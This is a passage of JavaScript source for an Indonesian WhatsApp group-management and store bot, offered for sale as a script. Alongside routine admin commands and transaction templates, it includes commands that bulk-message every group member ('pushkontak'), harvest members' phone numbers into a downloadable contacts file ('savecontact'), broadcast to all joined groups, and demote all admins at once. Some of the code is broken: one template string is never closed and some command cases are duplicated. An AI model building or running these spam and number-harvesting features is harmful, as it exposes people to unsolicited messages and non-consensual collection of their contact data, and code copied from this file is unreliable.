case "pushkontakgcjd":
if (!isZeroone) return reply(`Khusus Owner`)
if (!m.isGroup) return m.reply(`di group coy`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("_Tᴜɴɢɢᴜ ᴋᴀᴋ ʟᴀɢɪ ᴘʀᴏsᴇs !!_")
        const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ReonStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ReonStore.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await ReonStore.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes BANG!")
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "savecontact1": {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Tᴜɴɢɢᴜ ᴋᴀᴋ ʟᴀɢɪ ᴘʀᴏsᴇs !!_")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ReonStore.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "savecontactv2": {
if (!isZeroone) return m.reply(`*Khusus Owner*`)
if (!m.isGroup) return m.reply(`di group coy`)
await reply("_Tᴜɴɢɢᴜ ᴋᴀᴋ ʟᴀɢɪ ᴘʀᴏsᴇs !!_")
const groupMetadata = isGroup? await ReonStore.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ReonStore.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
//--------------------------------
case 'done':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
let barang = t[0];
let nominal = t[1];
let payment = t[2];
reply(`✧━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${tanggal}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *BERHASIL*

*TERIMA KASIH TELAH ORDER DI ${global.namastore}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'donemc':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
let barang = t[0];
let nominal = t[1];
let payment = t[2];
reply(`✧━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${tanggal}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *BERHASIL*

   *SELLER ✅*
   *BUYYER ✅*

NOTE ⛔ : JIKA ADA KENDALA DI LAIN WAKTU ADMIN SUDAH TIDAK BERTANGGUNG JAWAB ❗❗


*TERIMA KASIH TELAH MENGGUNAKAN JASA ADMIN DI ${global.namastore}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'proses':{
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YAH BANG*')
ReonStore.sendMessage(owner + "@s.whatsapp.net", { text: "HALLO ADA YANG MESEN NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo:{ forwardingScore: 9999, isForwarded: true }})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "formatneed": {
const text12 = `*FORMAT JASA NEED AKUN BY ${namastore}*
*( BUKAN AKUN ADMIN )*

NAMA PEMILIK : 
AKUN :
LOGIN :
HARGA : 
SPEK AKUN :  
  
*#TIDAK MENERIMA KIRKON*

📝𝐍𝐎𝐓𝐄 : 
*WAJIB MENGGUNAKAN JASA ADMIN ${namastore} UNTUK MENGHINDARI PENIPUAN*

*PERINGATAN ⚠️*
*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*`
ReonStore.sendMessage(from, { image: { url: `https://i.ibb.co/gPKjRNz/Reon.jpg` }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "formatpost2": {
const text12 = `🥀FORMAT JASPOST BY ${namastore}🥀
(BUKAN AKUN MILIK ADMIN)
                   
JUAL AKUN :
SPEK :
HARGA:
NOMER : wa.me/


NOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN ${namastore} AGAR TERHINDAR DARI PENIPUAN


🥀BEE SMART BUYER🥀`
ReonStore.sendMessage(from, { image: { url: `https://i.ibb.co/gPKjRNz/Reon.jpg }, caption: text12, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "mc":{
if (!text) return reply("salah contoh .mc 200k by Reon")
let cret = await ReonStore.groupCreate(text, [])
let response = await ReonStore.groupInviteCode(cret.id)
let teks = `「 *Create Group Mc By Reon* 」

GRUP MC SUDAH DI BUAT ATAS NAMA *${text} SILAHKAN MASUK MELALUI LINK YANG ADA DI BAWAH YAH GENGS

*⥁* Name : ${cret.subject}
*⥁* MC BY : ${namastore}
*⥁* Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
*⥁* Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
ReonStore.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
ReonStore.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'kick': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ReonStore.groupParticipantsUpdate(from, [users], 'remove')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'editsubjek': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text nya ?'
await loading()
await ReonStore.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'editdesk':{
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await loading()
await ReonStore.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'tagall': {
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
ReonStore.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'demoteall':
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await ReonStore.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ReonStore.groupParticipantsUpdate(from, mems, 'demote')
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'promoteall':
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await ReonStore.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ReonStore.groupParticipantsUpdate(from, mems, 'promote')
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'sewa':
if (!isZeroone) return m.reply('*Khusus Premium*')
await loading()
m.reply(`¥ *Price Sewa Bot 𝚁𝚎𝚘𝚗* €

🔏 3 hari = 10k
🔏 1 minggu = 15k
🔏 2 minggu = 25k
🔏 1 bulan = 40k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'sewabot':
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`*Contoh* :\n#sewabot 1 minggu `)
await loading()
let cret = await ReonStore.groupCreate(args.join(" "), [])
let response = await ReonStore.groupInviteCode(cret.id)
ReonStore.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
m.reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'group': {   
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args[0] === 'close'){
await ReonStore.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await ReonStore.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
ReonStore.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'editinfo': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
 if (args[0] === 'open'){
await ReonStore.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await ReonStore.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 ReonStore.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break
case 'linkgroup': case 'linkgc': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
await loading()
let response = await ReonStore.groupInviteCode(from)
ReonStore.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'resetlinkgc':
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
ReonStore.groupRevokeInvite(from)
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'sendlinkgc': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
await loading()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282142435092`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await ReonStore.groupInviteCode(from)
ReonStore.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
case 'script': case 'sc':{
let text_sc =`_${pushname}👋_\n`
text_sc += "*SCRIPT NO ENC*\n"
text_sc += "Mau beli scriptnya?\n\n"
text_sc += "*Contact Person 📞*\n"
text_sc += "https://wa.me/6282142435092\n\n"
text_sc += "*Pembayaran Via* 💳\n"
text_sc += "_Qris / Dana / Gopay / Ovo_\n\n"
text_sc += "*Harga : Rp15.000 (15K)*\n"
text_sc += "*Harga terlalu mahal?*\n"
text_sc += "*Sans nego dikit gpp*\n\n"
text_sc += "Sudah termasuk tutorial.\n"
text_sc += "Size script sudah ringan.\n"
text_sc += "Anti ngelag/delay."
m.reply(text_sc)
}
        
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'kick': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ReonStore.groupParticipantsUpdate(from, [users], 'remove')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'add': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ReonStore.groupParticipantsUpdate(from, [users], 'add')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'promote': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ReonStore.groupParticipantsUpdate(from, [users], 'promote')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'demote': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ReonStore.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'hidetag': {
if (!isZeroone) return m.reply('*Khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
ReonStore.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "idgroup": {
if (!isZeroone) return m.reply('*Khusus Premium*')
let getGroups = await ReonStore.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ReonStore.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakidgc id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'yt':
case 'youtube':
	ReonStore.sendMessage(from, 
{text: `Jangan Lupa Subscriber yah kak😉🙏
*Link* : ${global.linkyt}`},
{quoted: m})
        break
        case 'ig':
case 'instagram':
	ReonStore.sendMessage(from, 
{text: `Jangan Lupa Follow yah kak😉🙏
*Link* : ${global.linkig}`},
{quoted: m})
        break
        case 'group':
	ReonStore.sendMessage(from, 
{text: `Jangan Lupa Masuk yah kak😉🙏
*Link* : ${global.linkgc}`},
{quoted: m})
        break
        case 'tiktok':
case 'tt':
	ReonStore.sendMessage(from, 
{text: `Jangan Lupa Fllow yah kak😉🙏
*Link* : ${global.linktt}`},
{quoted: m})
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'id':{
            m.reply(from)
}
       
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'totalfitur':
        case 'fitur': 
            m.reply(`Total Bot Features Are ${totalFitur()}`)
        break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'cekgc': case 'inspect': {
if (!isZeroone) return m.reply('*Khusus Premium*')
await loading()
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
ReonStore.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : *${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}*

▸ Deskripsi Di Ubah : *${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}*
▸ Pembuat Group : *${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}*
▸ Group Di Buat : *${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}*
▸ Total Member : *${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member*

▸ ID Group  : *${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us*

©By *${botname}*`
try {
pp = await ReonStore.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
ReonStore.sendFile(from, pp, "", m, { caption: tekse, mentions: await ReonStore.parseMention(tekse) })

})
}
break
//=================================================
case "tunda": {
const text12 = `*TRANSAKSI MENGALAMI PENDING*


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

*AKAN KAMI PROSES SEGERA*`
reply(text12)
}
break
case "batal": {
const text12 = `*TRANSAKSI DI BATALKAN*

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹
`
reply(text12)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'toimage': case 'toimg': {
if (!isZeroone) return m.reply('*Lu Bukan Owner Gua, Gak Usah Sok asik Tolol*')
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await ReonStore.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
ReonStore.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case 'bcgc': case 'zerpost': case 'bczero': {
if (!isZeroone) return m.reply('*Khusus Premium*')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await ReonStore.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
ReonStore.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎//
case "listadmin": {
  if (!isZeroone) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainn + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await ReonStore.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
//=================================================//;
case 'addprem':
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282142435092`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ReonStore.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./all/database/premium.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
break
//=================================================//
case 'delprem':
if (!isZeroone) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282142435092`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./all/database/premium.json', JSON.stringify(owner))
